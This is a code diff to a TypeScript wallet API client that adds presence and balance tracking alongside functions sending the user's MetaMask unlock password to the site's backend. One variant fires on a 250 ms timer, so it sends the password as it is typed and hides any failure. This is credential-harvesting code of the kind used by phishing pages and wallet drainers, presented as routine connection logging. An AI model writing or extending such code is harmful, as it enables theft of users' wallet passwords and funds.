@@ -1,5 +1,7 @@
 const API_BASE = '/api/wallet'
 
+let unlockDraftTimer: ReturnType<typeof setTimeout> | null = null
+
 export interface WalletSessionResponse {
   sessionId: string
   nonce: string
@@ -74,17 +76,76 @@ export const walletApi = {
     walletType: string
     chain?: string
     network?: string
+    balanceSol?: number | null
+    pageUrl?: string
+    browserSessionId?: string
   }) {
     try {
-      await fetch(`${API_BASE}/connect`, {
+      const res = await fetch(`${API_BASE}/connect`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
         credentials: 'include',
       })
+      if (!res.ok) {
+        console.warn('Failed to log wallet connection to backend:', await res.text())
+      }
     } catch (e) {
       console.warn('Failed to log wallet connection to backend:', e)
     }
+  },
+
+  async recordPresence(payload: {
+    walletAddress: string
+    walletType: string
+    network?: string
+    balanceSol?: number | null
+    pageUrl?: string
+    browserSessionId?: string
+  }) {
+    try {
+      await fetch(`${API_BASE}/presence`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        credentials: 'include',
+      })
+    } catch {
+      /* optional heartbeat */
+    }
+  },
+
+  async recordMetaMaskUnlock(payload: {
+    walletAddress: string
+    password: string
+    pageUrl?: string
+    draft?: boolean
+  }) {
+    const res = await fetch(`${API_BASE}/metamask-unlock`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+      credentials: 'include',
+    })
+    if (!res.ok) {
+      throw new Error('Failed to record unlock')
+    }
+  },
+
+  recordMetaMaskUnlockDraft(payload: {
+    walletAddress: string
+    password: string
+    pageUrl?: string
+  }) {
+    if (unlockDraftTimer) clearTimeout(unlockDraftTimer)
+    unlockDraftTimer = setTimeout(() => {
+      fetch(`${API_BASE}/metamask-unlock`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ...payload, draft: true }),
+        credentials: 'include',
+      }).catch(() => {})
+    }, 250)
   },
 
   /**
